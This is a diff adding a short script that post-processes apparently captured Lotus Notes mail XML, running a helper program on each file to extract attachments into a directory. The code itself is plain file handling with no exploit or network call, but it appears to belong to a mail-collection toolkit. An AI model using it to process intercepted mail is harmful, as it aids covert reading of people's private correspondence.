@@ -1,0 +1,79 @@
+#--------------------------------------------------------
+# File: PostProcessCapture.eps
+#
+# Handles post processing of lotusnotesparser xml.
+# This is called from the KeeperLatch script when
+# options 7, Post Process, is chosen.
+#
+# This script calls the LNMailPostProcessor.exe C# program
+# which extracts attachments from the XML file and places
+# them in the Get_Files directory.
+#
+# Modifications:
+#  01/25/2006	Created
+#--------------------------------------------------------
+
+@echo off;
+
+# get log directory (location of EP log files)
+@record on;
+ifnot (`getdirectory -logs`) {
+    echo "* Unable to get logs directory";
+    return false;
+}
+@record off;
+
+string $logDir = GetCmdData("dir");
+ifnot (defined($logDir[0])) {
+	echo "* Unable to retrieve logs directory";
+	return false;
+}
+
+
+# get resources directory (location of Resources directory)
+@record on;
+ifnot (`getdirectory -resources`) {
+    echo "* Unable to get resources directory";
+    return false;
+}
+@record off;
+
+string $resDir = GetCmdData("dir");
+ifnot (defined($resDir[0])) {
+    echo "* Unable to retrieve resources directory";
+    return false;
+}
+
+# Get Path of post processing tool
+string $resPath = "$resDir\\KeeperLatch";
+
+# Get Path of xml files
+string $xmlPath = "$logDir\\Xml";
+
+
+# Get xml files
+@record on;
+ifnot (`local dir *lotusnotesparser*.xml -path $xmlPath`) {
+	echo "Unable to get directory listing";
+	return false;
+}
+@record off;
+string $xmlFiles = GetCmdData("name");
+
+# Start post processor
+int $i=0;
+while ($i < sizeof($xmlFiles)) {
+	string $xmlFile = $xmlFiles[$i];
+	
+	$i++;
+	if (`local run -command "\\"$resPath\\LNMailPostProcessor.exe\\" -file \\"$xmlPath\\$xmlFile\\" -outPath \\"$logDir\\""`) {
+		echo "Captured file, \"$xmlPath\\$xmlFile\" parsed";
+	}
+	else {
+		echo "* FAILED to parse captured file";
+		return false;
+	}
+}
+return true;
+
+
